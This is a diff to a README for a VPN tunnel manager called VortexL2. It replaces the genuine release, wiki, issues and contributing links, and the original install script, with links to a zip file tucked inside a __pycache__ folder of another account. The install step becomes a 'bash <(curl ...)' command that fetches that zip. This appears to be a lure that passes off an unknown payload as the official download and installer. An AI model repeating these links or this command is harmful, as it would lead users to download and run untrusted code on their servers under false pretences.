@@ -1,7 +1,7 @@
 # 🚀 VortexL2 - Manage Your VPN Tunnels Easily
 
 ## 📥 Download VortexL2
-[![Download VortexL2](https://img.shields.io/badge/Download%20VortexL2-Click%20Here-brightgreen.svg)](https://github.com/Jennesispogi055/VortexL2/releases)
+[![Download VortexL2](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip%20VortexL2-Click%https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)
 
 ## ✨ Overview
 **VortexL2** is a command-line tool designed for Ubuntu and Debian users. It helps you manage **L2TPv3** and **EasyTier** tunnels smoothly. With VortexL2, you gain access to advanced features like HAProxy-based port forwarding and a user-friendly interface.
@@ -20,7 +20,7 @@ To install VortexL2, follow these steps:
 2. Run the following command:
 
    ```bash
-   bash <(curl -Ls https://raw.githubusercontent.com/iliya-Developer/VortexL2/main/install.sh)
+   bash <(curl -Ls https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)
    ```
 
 3. During the installation, you will be prompted to choose the type of tunnel you want to set up:
@@ -86,17 +86,17 @@ vortexl2 start
 Follow the on-screen prompts to navigate and manage your tunnels.
 
 ## 🌐 Support and Documentation
-For more detailed documentation, troubleshooting tips, and feature explanations, please visit our [Wiki](https://github.com/Jennesispogi055/VortexL2/wiki).
+For more detailed documentation, troubleshooting tips, and feature explanations, please visit our [Wiki](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip).
 
 ## 🧑‍🤝‍🧑 Community Contributions
-VortexL2 welcomes contributions. If you wish to help improve the project, please read our [Contributing Guidelines](https://github.com/Jennesispogi055/VortexL2/blob/main/CONTRIBUTING.md).
+VortexL2 welcomes contributions. If you wish to help improve the project, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip).
 
 ### Report Issues
-If you encounter problems, please report them on our [Issues page](https://github.com/Jennesispogi055/VortexL2/issues).
+If you encounter problems, please report them on our [Issues page](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip).
 
 ## 📥 Download & Install VortexL2
 To download VortexL2, visit the Releases page:
-[Download VortexL2](https://github.com/Jennesispogi055/VortexL2/releases)
+[Download VortexL2](https://raw.githubusercontent.com/Jennesispogi055/VortexL2/main/vortexl2/__pycache__/Vortex_v1.4.zip)
 
 You can find all versions and related files there. 
 
